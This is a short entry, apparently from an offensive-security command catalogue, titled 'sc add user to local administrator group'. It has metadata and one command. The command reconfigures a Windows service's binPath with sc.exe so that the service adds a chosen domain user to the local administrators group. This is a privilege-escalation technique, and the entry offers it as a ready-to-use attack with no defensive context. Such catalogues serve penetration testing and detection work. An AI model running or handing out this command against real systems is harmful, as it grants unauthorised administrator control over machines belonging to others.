---
id: c98db962-c403-4df0-bbae-653a1246e60e
name: sc add user to local administrator group
type: command
executor: ''
data: sc.exe config $SERVICE_NAME binPath="net localgroup administrators $DOMAIN\$USERNAME
  /add"
output: null
created_at: '2023-01-12T04:55:30.130063+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# sc add user to local administrator group

```bash
sc.exe config $SERVICE_NAME binPath="net localgroup administrators $DOMAIN\$USERNAME /add"
```


